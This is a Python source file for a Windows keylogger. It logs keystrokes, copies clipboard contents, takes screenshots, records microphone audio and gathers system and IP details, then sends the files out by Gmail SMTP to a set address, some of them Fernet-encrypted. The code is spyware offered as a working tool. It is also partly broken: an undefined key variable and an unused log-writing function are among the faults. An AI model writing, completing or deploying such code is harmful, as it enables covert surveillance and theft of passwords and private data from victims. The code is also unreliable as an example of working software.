# librabries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

import sounddevice as sd
from scipy.io.wavfile import write

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process
from PIL import ImageGrab
from scipy.stats import false_discovery_control

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = ("abc@gmail.com")
password = ("*** *** ***")

toaddr = "xyz@gmail.com"

file_path = r"C:\Users\LENOVO\PycharmProjects\PythonProject\keylogger"
extend = "\\"
file_merge = file_path + extend

def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log file"

    body = "Hello World!"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload(attachment.read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)

def computer_information():
    with open (file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Public IP Address: None" + '\n')

        f.write("Processor : " + (platform.processor()) + '\n')
        f.write("System  : " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine  : " + platform.machine() + '\n')
        f.write("Hostname  : " + socket.gethostname() + '\n')
        f.write("Private IP  : " + IPAddr + '\n')

computer_information()

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write(pasted_data + '\n' + pasted_data)

        except:
            f.write("Clipboard could not be opened")

copy_clipboard()

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

microphone()

def screenshot ():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingtime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print (key)
        keys.append(key)
        count += 1
        currentTime = time.time()

    def write_file(keys, key_information=None):
        with open(file_path + extend + key_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write(k + "\n")
                    f.close()
                elif k.find("key") == -1:
                    f.write(k + "\n")
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingtime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingtime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingtime = time.time() + time_iteration

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encypting_files in files_to_encrypt:

    with open(files_to_encrypt[count], "rb") as f:
        data = f.read()

    fernet=Fernet(ket)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], "wb") as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count +=1

time.sleep(120)

def collect_and_send_info():
    import socket
    import platform
    import os

    system_info = f"""
    Hostname: {socket.gethostname()}
    IP Address: {socket.gethostbyname(socket.gethostname())}
    System: {platform.system()} {platform.version()}
    Machine: {platform.machine()}
    """

    with open("system_info.txt", "w") as f:
        f.write(system_info)

    send_email("system_info.txt", "system_info.txt", "abc@gmail.com")
